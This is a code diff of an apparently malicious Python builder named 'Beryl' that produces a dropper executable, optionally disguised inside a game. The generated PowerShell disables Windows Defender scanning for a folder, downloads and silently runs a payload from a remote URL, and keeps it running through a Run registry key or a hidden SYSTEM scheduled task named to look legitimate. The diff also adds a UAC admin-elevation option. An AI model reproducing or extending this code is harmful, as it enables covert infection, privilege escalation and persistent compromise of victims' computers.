@@ -12,7 +12,8 @@ def display_ansi_art(file_path):
         ansi_art = file.read()
     print(ansi_art)
 
-def create_exe(py_file, game_type):
+def create_exe(py_file, game_type,uac):
+
     try:
         icons_directory = "icons"
         icon_file = os.path.join(icons_directory, 'Beryl.ico')  # Default icon file path
@@ -29,28 +30,25 @@ def create_exe(py_file, game_type):
         elif game_type == "turtle":
             icon_file = os.path.join(icons_directory, 'turtle.ico')
             name = "Turtle"
-        is_windows = platform.system().lower() == "windows"
-        python_executable = "python" if is_windows else "python3"
+        uac_option = "--uac-admin" if uac else "--nowindowed"
+
+
         pyinstaller_command = [
-        python_executable, "-m", "nuitka",
-    "--onefile",
-    "--company-name=Beryl",
-    "--file-version=1.2",
-    "--copyright=COPYRIGHT@Beryl",
-    "--trademarks=Death is just a long slumber",
-    f"--windows-icon-from-ico={icon_file}",
-    "--disable-console",
-    "--windows-uac-admin",
-    "--standalone",
-    "--remove-output",
-    f"--output-dir=Output",
-    f"--output-filename={name}",
+            "pyinstaller",
+            "--onefile",
+            "--icon", icon_file,
+            "--name", name,
+            "--noconsole",
+            uac_option,
+            "--distpath=Output",
             py_file
         ]
+
         subprocess.run(pyinstaller_command)
         print("Executable created successfully.")
     except Exception as e:
         print("An error occurred:", str(e))
+
 
 def main():
     colorama.init(autoreset=True)  # Initialize colorama for Windows
@@ -70,7 +68,7 @@ def main():
     display_ansi_art(random_ans_file)
     introduction = (
         Fore.GREEN + "Death Is Not The End, Death Is Just A Long Slumber\n"
-        "Version: 1.0\n"
+        "Version: 1.2\n"
         "Author: ELMERIKH\n" + Style.RESET_ALL
     )
     print(introduction)
@@ -82,6 +80,7 @@ def main():
     parser.add_argument("-n", "--output_name", required=True, help="Name of output executable")
     parser.add_argument("-g", "--game_type", choices=game_types, required=False, help="Name of game to embed into. If not specified, no GUI executable will be generated")
     parser.add_argument("-dll", "--dll",  required=False, help="name of function to run with dll file")
+    parser.add_argument("-uac",action="store_true", help="UAC,if not choosen attempts to escalate privilege")
 
     args = parser.parse_args()
     
@@ -89,10 +88,9 @@ def main():
         global pow
         home = os.path.expanduser("~")
         path=os.path.join(home,args.directory_path,args.output_name)
-        #subprocess.run(args=["reg", "add", "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run",
-          #             "/v", "empyrean", "/t", "REG_SZ", "/d", f"C:\\Windows\\System32\\rundll32.exe '{path}.dll', DllRegisterServer ", "/f"], shell=True)
+       
         path = path.replace("\\", "\\\\")
-
+        fcn={args.dll}
         powershell_template = [
         "$directoryPath = Join-Path $HOME '{directory_path}'",
         "Add-MpPreference -ExclusionPath $directoryPath",
@@ -103,7 +101,7 @@ def main():
         "Invoke-WebRequest -Uri $url -OutFile $outputFile",
         "$installerPath = $outputFile",
         "start C:\\\\Windows\\\\System32\\\\rundll32.exe $outputFile, {dll}",
-        f'reg.exe add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v empyrean /t REG_SZ /d \\"C:\\\\Windows\\\\System32\\\\rundll32.exe {path}.dll, DllRegisterServer\\" /f',
+        f'reg.exe add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v BERYL /t REG_SZ /d \\"C:\\\\Windows\\\\System32\\\\rundll32.exe {path}.dll, {fcn}\\" /f',
         
         
         
@@ -120,22 +118,34 @@ def main():
         "$directoryPath = Join-Path $HOME '{directory_path}'",
         "Add-MpPreference -ExclusionPath $directoryPath",
         "$url = '{url}'",
-        "$targetDirectory = Join-Path $HOME '{target_directory}'",
+        "$targetDirectory = Join-Path $HOME '{directory_path}'",
         "if (-not (Test-Path -Path $targetDirectory)) {{New-Item -Path $targetDirectory -ItemType Directory -Force}}",
         "$outputFile = Join-Path $targetDirectory '{output_name}.exe'",
         "$programName = '{output_name}'",
-        "$programPath = $outputFile  ",
-        "$registryPath = 'HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run'",
-        f'Set-ItemProperty -Path $registryPath -Name $programName -Value \\"{path}.exe \\" ',
+        "$programPath = $outputFile ",
         "Invoke-WebRequest -Uri $url -OutFile $outputFile",
         "$installerPath = $outputFile",
-        "Start-Process -FilePath $installerPath -Wait -WindowStyle Hidden"
+        "$taskName = 'User_Feed_ESRV'",
+        "$taskPath = $programPath ",
+        "schtasks /create /SC ONLOGON /TN $taskName /TR $taskPath /RU SYSTEM /RL HIGHEST /IT",
+        "$taskFolder = '\\'",
+        "$objService = New-Object -ComObject 'Schedule.Service'",
+        "$objService.Connect()",
+        "$objRootFolder = $objService.GetFolder($taskFolder)",
+        "$objTask = $objRootFolder.GetTask($taskName)",
+        "$objTaskDefinition = $objTask.Definition",
+        "$objTaskDefinition.Settings.StopIfGoingOnBatteries = $false",
+        "$objTaskDefinition.Settings.DisallowStartIfOnBatteries = $false",
+        "$objTaskDefinition.Settings.Hidden = $true",
+        "$objTaskDefinition.Settings.StartWhenAvailable = $true",
+        "$objTaskDefinition.Settings.Priority = 1",
+        "$objRootFolder.RegisterTaskDefinition($taskName, $objTaskDefinition, 6, $null, $null, 0, $null)",
+        "Start-Process -FilePath $installerPath -PassThru -WindowStyle Hidden -Verb RunAs"
     ]   
         pow=powershell_template
 
-#subprocess.run(args=["reg", "add", "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run",
- #                      "/v", "empyrean", "/t", "REG_SZ", "/d", f"{self.working_dir}\\run.bat", "/f"], shell=True)
-# Combine the PowerShell lines into a single string
+
+
 
     powershell_script = '\n'.join(pow)
 
@@ -181,7 +191,7 @@ def main():
 # Write the updated content back to paw.py
     with open(paw_path, 'w') as paw_file:
      paw_file.write(new_paw_contents)
-
+    
     with open('paw.py', 'r') as paw_file:
         paw_contents = paw_file.read()
 
@@ -222,7 +232,7 @@ def main():
             with open('pew.py', 'w') as pew_file:
                 pew_file.write(combined_contents)
             print("Creating the executable...")
-            create_exe('pew.py', args.game_type.lower())
+            create_exe('./pew.py', args.game_type.lower(),args.uac)
             print("Finished creating the executable  in Output folder.")    
     else:
         print('\n')
@@ -237,7 +247,9 @@ def main():
     # Display message and create exe file
         print("Creating the executable...")
         print('\n')
-        create_exe('pew.py',"no gui")
+        
+        create_exe('./pew.py',"no gui",args.uac)
+             
         print("Finished creating the executable in Output folder.")
 
 if __name__ == "__main__":
